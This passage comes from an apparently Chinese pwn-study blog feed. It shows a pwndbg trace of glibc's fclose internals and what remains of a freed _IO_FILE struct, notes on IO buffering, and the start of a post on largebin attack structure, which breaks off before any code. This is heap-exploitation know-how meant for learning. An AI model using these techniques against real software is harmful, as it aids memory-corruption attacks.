class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bece &lt;_IO_file_close_it+62&gt;    mov    r12, qword ptr [rbx + 0xd8]     R12, [0x555555559378] =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8bed5 &lt;_IO_file_close_it+69&gt;    lea    rdx, [rip + 0x18ab24]           RDX =&gt; 0x7ffff7e16a00 (_IO_helper_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8bedc &lt;_IO_file_close_it+76&gt;    lea    rax, [rip + 0x18b885]           RAX =&gt; 0x7ffff7e17768 ◂— 0</span><br><span class="line">0x7ffff7c8bee3 &lt;_IO_file_close_it+83&gt;    sub    rax, rdx                        RAX =&gt; 0xd68 (0x7ffff7e17768 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8bee6 &lt;_IO_file_close_it+86&gt;    mov    rcx, r12                        RCX =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8bee9 &lt;_IO_file_close_it+89&gt;    sub    rcx, rdx                        RCX =&gt; 0xc00 (0x7ffff7e17600 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8beec &lt;_IO_file_close_it+92&gt;    cmp    rax, rcx                        0xd68 - 0xc00     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x00007ffff7c8beef &lt;+95&gt;:    jbe    0x7ffff7c8bfe0 &lt;_IO_new_file_close_it+336&gt;</span><br></pre></td></tr></table></figure><p>仍然是<code>vtable</code>的安全检查机制，<code>&lt;_IO_new_file_close_it+336&gt;</code>处就是<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c8bfe0 &lt;+336&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br></pre></td></tr></table></figure><p>不再赘述，后续调用<code>vtable-&gt;_IO_file_close</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bef5 &lt;_IO_file_close_it+101&gt;    mov    rdi, rbx     RDI =&gt; 0x5555555592a0 ◂— 0xfbad2c04</span><br><span class="line">0x7ffff7c8bef8 &lt;_IO_file_close_it+104&gt;    call   qword ptr [r12 + 0x88]      &lt;_IO_file_close&gt;</span><br></pre></td></tr></table></figure><p>调用<code>__close_nocancel</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8a590 &lt;_IO_file_close&gt;         endbr64</span><br><span class="line">0x7ffff7c8a594 &lt;_IO_file_close+4&gt;       mov    edi, dword ptr [rdi + 0x70]     EDI, [0x555555559310] =&gt; 3</span><br><span class="line">0x7ffff7c8a597 &lt;_IO_file_close+7&gt;       jmp    __close_nocancel            &lt;__close_nocancel&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7d19860 &lt;__close_nocancel&gt;       endbr64</span><br><span class="line">0x7ffff7d19864 &lt;__close_nocancel+4&gt;     mov    eax, 3            EAX =&gt; 3</span><br><span class="line">0x7ffff7d19869 &lt;__close_nocancel+9&gt;     syscall  &lt;SYS_close&gt;</span><br></pre></td></tr></table></figure><p>而<code>__close_nocancel</code>直接系统调用<code>close</code>函数来关闭文件描述符<br>后续回到<code>_IO_file_close_it</code>，调用<code>_IO_setb</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bf47 &lt;_IO_file_close_it+183&gt;    xor    ecx, ecx     ECX =&gt; 0</span><br><span class="line">0x7ffff7c8bf49 &lt;_IO_file_close_it+185&gt;    xor    edx, edx     EDX =&gt; 0</span><br><span class="line">0x7ffff7c8bf4b &lt;_IO_file_close_it+187&gt;    xor    esi, esi     ESI =&gt; 0</span><br><span class="line">0x7ffff7c8bf4d &lt;_IO_file_close_it+189&gt;    mov    rdi, rbx     RDI =&gt; 0x5555555592a0 ◂— 0xfbad2c04</span><br><span class="line">0x7ffff7c8bf50 &lt;_IO_file_close_it+192&gt;    call   _IO_setb                    &lt;_IO_setb&gt;</span><br></pre></td></tr></table></figure><p>这里<code>_IO_setb</code>还调用<code>free</code>函数释放了缓冲区<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8dc74 &lt;_IO_setb+84&gt;    call   free@plt                    &lt;free@plt&gt;</span><br><span class="line">        ptr: 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br></pre></td></tr></table></figure><p><code>_IO_setb</code>结束后可以看到<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$10 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537083,</span><br><span class="line">    _IO_read_ptr = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_read_end = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_read_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_ptr = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_buf_base</code>,<code>_IO_buf_end</code>都已经清空<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x1e0 (with flag bits: 0x1e1)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559470</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555594a0</span><br><span class="line">Size: 0x20b60 (with flag bits: 0x20b61)</span><br></pre></td></tr></table></figure><p>对应的缓冲区chunk也被释放（这里被<code>topchunk</code>合并）<br>然后刷新读写指针<br>将指针全部清空了（<code>xmmword</code>是16字节单元）<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bf55 &lt;_IO_file_close_it+197&gt;    pxor   xmm0, xmm0</span><br><span class="line">0x7ffff7c8bf59 &lt;_IO_file_close_it+201&gt;    mov    rdi, rbx                           RDI =&gt; 0x5555555592a0 ◂— 0xfbad2c05</span><br><span class="line">0x7ffff7c8bf5c &lt;_IO_file_close_it+204&gt;    movups xmmword ptr [rbx + 8], xmm0</span><br><span class="line">0x7ffff7c8bf60 &lt;_IO_file_close_it+208&gt;    movups xmmword ptr [rbx + 0x18], xmm0</span><br><span class="line">0x7ffff7c8bf64 &lt;_IO_file_close_it+212&gt;    movups xmmword ptr [rbx + 0x28], xmm0</span><br></pre></td></tr></table></figure><p>后续再次调用<code>_IO_un_link</code>确保从<code>_IO_list_all</code>中脱离<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bf68 &lt;_IO_file_close_it+216&gt;    call   _IO_un_link                 &lt;_IO_un_link&gt;</span><br><span class="line">        rdi: 0x5555555592a0 ◂— 0xfbad2c05</span><br></pre></td></tr></table></figure><p>再往下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bf6d &lt;_IO_file_close_it+221&gt;    test   r12d, r12d                                     0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8bf70 &lt;_IO_file_close_it+224&gt;    mov    dword ptr [rbx], 0xfbad240c                    [0x5555555592a0] &lt;= 0xfbad240c</span><br><span class="line">0x7ffff7c8bf76 &lt;_IO_file_close_it+230&gt;    mov    dword ptr [rbx + 0x70], 0xffffffff             [0x555555559310] &lt;= 0xffffffff</span><br><span class="line">0x7ffff7c8bf7d &lt;_IO_file_close_it+237&gt;  ✔ cmove  r12d, ebp</span><br><span class="line">0x7ffff7c8bf81 &lt;_IO_file_close_it+241&gt;    mov    qword ptr [rbx + 0x90], 0xffffffffffffffff     [0x555555559330] &lt;= 0xffffffffffffffff</span><br></pre></td></tr></table></figure><p>设置<code>_flags</code>,<code>_fileno</code>和<code>_offset</code>域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$11 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539124,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = -1,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到指针全部清空，<code> _offset</code>和<code>_fileno</code>都被设置为-1<br>最后回到<code>_IO_new_fclose</code>函数，再对<code>vtable</code>安全检查后，调用<code>vtable-&gt;_IO_file_finish</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ecd9 &lt;fclose+105&gt;    xor    esi, esi     ESI =&gt; 0</span><br><span class="line">0x7ffff7c7ecdb &lt;fclose+107&gt;    mov    rdi, rbp     RDI =&gt; 0x5555555592a0 ◂— 0xfbad240c</span><br><span class="line">0x7ffff7c7ecde &lt;fclose+110&gt;    call   qword ptr [rbx + 0x10]      &lt;_IO_file_finish&gt;</span><br></pre></td></tr></table></figure><p>函数首先检查了文件描述符是否打开，其已经被设置为-1，所以不会进入该流程。如果文件打开的话则会调用<code>_IO_do_flush</code>和<code>_IO_SYSCLOSE</code>刷新缓冲区以及关闭文件。<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bffd &lt;_IO_file_finish+13&gt;     cmp    dword ptr [rdi + 0x70], -1     0xffffffff - -0x1     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8c001 &lt;_IO_file_finish+17&gt;   ✔ je     _IO_file_finish+106         &lt;_IO_file_finish+106&gt;</span><br></pre></td></tr></table></figure><p>接着调用<code>_IO_default_finish</code>确认缓冲区确实被释放，以及结构体从<code>_IO_list_all</code>中取了下来，并设置指针<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c05a &lt;_IO_file_finish+106&gt;    add    rsp, 8       RSP =&gt; 0x7fffffffdc48 (0x7fffffffdc40 + 0x8)</span><br><span class="line">0x7ffff7c8c05e &lt;_IO_file_finish+110&gt;    mov    rdi, rbp     RDI =&gt; 0x5555555592a0 ◂— 0xfbad240c</span><br><span class="line">0x7ffff7c8c061 &lt;_IO_file_finish+113&gt;    xor    esi, esi     ESI =&gt; 0</span><br><span class="line">0x7ffff7c8c063 &lt;_IO_file_finish+115&gt;    pop    rbx          RBX =&gt; 0x7ffff7e17600 (_IO_file_jumps)</span><br><span class="line">0x7ffff7c8c064 &lt;_IO_file_finish+116&gt;    pop    rbp          RBP =&gt; 0x5555555592a0</span><br><span class="line">0x7ffff7c8c065 &lt;_IO_file_finish+117&gt;    jmp    _IO_default_finish          &lt;_IO_default_finish&gt;</span><br></pre></td></tr></table></figure><p>可以看到判断<code>[rdi + 0x38]</code>也就是<code>_IO_buf_base</code>是否为0，确认缓冲区确实被释放<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8e734 &lt;_IO_default_finish+4&gt;     push   rbp</span><br><span class="line">0x7ffff7c8e735 &lt;_IO_default_finish+5&gt;     mov    rbp, rdi                        RBP =&gt; 0x5555555592a0 ◂— 0xfbad240c</span><br><span class="line">0x7ffff7c8e738 &lt;_IO_default_finish+8&gt;     mov    rdi, qword ptr [rdi + 0x38]     RDI, [0x5555555592d8] =&gt; 0</span><br><span class="line">0x7ffff7c8e73c &lt;_IO_default_finish+12&gt;    test   rdi, rdi                        0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8e73f &lt;_IO_default_finish+15&gt;  ✔ je     _IO_default_finish+23       &lt;_IO_default_finish+23&gt;</span><br></pre></td></tr></table></figure><p>接着又检查了很多域<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8e747 &lt;_IO_default_finish+23&gt;    mov    rax, qword ptr [rbp + 0x60]     RAX, [0x555555559300] =&gt; 0</span><br><span class="line">0x7ffff7c8e74b &lt;_IO_default_finish+27&gt;    test   rax, rax                        0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8e74e &lt;_IO_default_finish+30&gt;  ✔ je     _IO_default_finish+48       &lt;_IO_default_finish+48&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8e760 &lt;_IO_default_finish+48&gt;    mov    rdi, qword ptr [rbp + 0x48]     RDI, [0x5555555592e8] =&gt; 0</span><br><span class="line">0x7ffff7c8e764 &lt;_IO_default_finish+52&gt;    test   rdi, rdi                        0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8e767 &lt;_IO_default_finish+55&gt;  ✔ je     _IO_default_finish+70       &lt;_IO_default_finish+70&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8e776 &lt;_IO_default_finish+70&gt;    test   byte ptr [rbp], 0x80            0xc &amp; 0x80     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8e77a &lt;_IO_default_finish+74&gt;  ✘ jne    _IO_default_finish+96       &lt;_IO_default_finish+96&gt;</span><br></pre></td></tr></table></figure><p>检查完后回到<code>_IO_new_fclose</code>，再经过一下检查判断后调用<code>free</code>来释放结构体的chunk<br><code>free</code>完后<code>fclose</code>函数全部结束<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ed1f &lt;fclose+175&gt;    mov    rdi, rbp     RDI =&gt; 0x5555555592a0 ◂— 0xfbad240c</span><br><span class="line">0x7ffff7c7ed22 &lt;fclose+178&gt;    call   free@plt                    &lt;free@plt&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x1e0 (with flag bits: 0x1e1)</span><br><span class="line">fd: 0x555555559</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559470</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555594a0</span><br><span class="line">Size: 0x20b60 (with flag bits: 0x20b61)</span><br></pre></td></tr></table></figure><p>已经被free掉了，我们仍然试着查看结构体信息<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$12 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1431655769,</span><br><span class="line">    _IO_read_ptr = 0x3649288fbc281a3 &lt;error: Cannot access memory at address 0x3649288fbc281a3&gt;,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = -1,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到直到<code>fclose</code>结束，<code>vatble</code>指针和<code>_chain</code>指针仍然保留着，同时也有一些其他域的信息仍然留存比如<code>_wide_data</code><br>而这里的<code>_flags</code>为<code>0x55555559</code>，其实是<code>tcachebin</code>中这个chunk经过<code>safe-linking</code>后的<code>fd</code>值<br></p><h2 id="0x06-IO缓冲机制"><a href="#0x06-IO缓冲机制" class="headerlink" title="0x06 IO缓冲机制"></a>0x06 IO缓冲机制</h2><p>我们会发现调试<code>fwrite</code>时候只写入了<code>_IO_FILE</code>的缓冲区，而没有直接写入文件，这是glibc的IO缓冲机制，因为系统调用<code>read</code>或者<code>write</code>的开销很大（需要从用户态切换到内核态），所以依赖缓冲区来优化<br>在调试<code>fwrite</code>时，我们发现<code>_IO_do_write</code>会系统调用<code>write</code>输出<code>fp-&gt;_IO_write_ptr</code>到<code>fp-&gt;_IO_write_base</code>之间的内容，这是在缓冲区剩余空间不足或者第一次初始化分配缓冲区时候，<code>_IO_file_overflow</code>调用<code>_IO_do_write</code>做的<br>我们调试的时候是第一次初始化分配缓冲区，所以没有系统调用<code>write</code>，如果是因为缓冲区剩余空间不足时调用<code>_IO_file_overflow</code>，则会系统调用<code>write</code>输出<code>fp-&gt;_IO_write_ptr</code>到<code>fp-&gt;_IO_write_base</code>之间的内容，相当于刷新了缓冲区，将数据真正写入文件中<br>而在调试<code>fread</code>时候，我们发现数据被系统调用<code>read</code>直接从文件读出来了，这也是因为第一次初始化分配缓冲区后，缓冲区无数据，调用<code>_IO_file_underflow</code>函数刷新缓冲区，系统调用<code>read</code>来读出了数据<br>综上我们发现，刷新缓冲区后，数据才真正读入或者输出，那么什么时候刷新缓冲区呢？见下图<br><img src="/images/buffer_flush.png"></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> _IO_FILE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于largebin attack</title>
      <link href="/2025/07/14/%E5%85%B3%E4%BA%8Elargebin%20attack/"/>
      <url>/2025/07/14/%E5%85%B3%E4%BA%8Elargebin%20attack/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>一直想要学习<code>_IO_FILE</code>攻击却一直没有腾出时间去学，就先记录一下经常与之结合使用的largebin attack来督促一下自己吧<br>参考博客<br><a href="https://xz.aliyun.com/news/15081">浅析Large_bins_attack在高低版本的利用-先知社区</a><br><a href="https://blog.csdn.net/qq_41202237/article/details/112825556">好好说话之Large Bin Attack_largebin attack-CSDN博客</a><br></p><h2 id="0x01-关于largebins"><a href="#0x01-关于largebins" class="headerlink" title="0x01 关于largebins"></a>0x01 关于largebins</h2><p>Glibc 的 <code>largebins</code> 共 63 个（索引 64–126），每个 bin 负责管理一个连续的大小区间分别为0x400<del>0x430,0x440</del>0x470,0x480<del>0x4b0,0x4c0</del>0x4f0，以此类推。故而进行largebin attack时应该选择申请大小在同一个bin下的chunk<br>每一个<code>largebin</code>与<code>unsorted bin</code>一样都是双向链表。其中的所有chunk是从大到小排序的，由<code>fd</code>指针和<code>bk</code>指针链接。而相同size的chunk又分为一个组，同组中，只有代表chunk的<code>fd_nextsize</code>和<code>bk_nextsize</code>有效，其余chunk的这两个指针为0。代表chunk间通过<code>fd_nextsize</code>和<code>bk_nextsize</code>链接，而最小size的组的代表chunk的<code>fd_nextsize</code>指向最大size的bin的代表chunk，最大size的bin的代表chunk的<code>bk_nextsize</code>也指向最小size的组的代表chunk。一个组的最后一个chunk的<code>fd</code>指向更小组的第一个chunk（如果有，无则指向bin表头）。代表chunk的<code>bk</code>指向上一个更大组的代表chunk（如果有，无则指向bin表头）。如此形成一个循环双向链表。结构大体如下所示（<strong>存在部分缺少，见图后补充</strong>）<br></p><p><img src="/images/largebin_struct_1.png"></p><p><strong>上图中chunk12的<code>fd</code>指向chunk20，chunk20的<code>bk</code>指向chunk12，<code>fd</code>指向chunk30，没有画出。</strong><br>再补充一张图<br></p><p><img src="/images/largebin_struct_2.png"></p><p>注意，与<code>fd</code>或<code>bk</code>指针一样（<code>tcachebin</code>除外，<code>tcachebin</code>中的“<code>fd</code>”（其实是<code>tcache_entry-&gt;next</code>）指向chunk的mem地址），<code>fd_nextsize</code>与<code>bk_nextsize</code>指向的并不是chunk的mem地址，而是堆头地址，即chunk的mem地址减去0x10。<br></p><h2 id="0x02-glibc2-23下的largebin-attack"><a href="#0x02-glibc2-23下的largebin-attack" class="headerlink" title="0x02 glibc2.23下的largebin attack"></a>0x02 glibc2.23下的largebin attack</h2><p>我们根据how2heap有关largebin attack的源码，精简一下<br></p><figure class="highlight 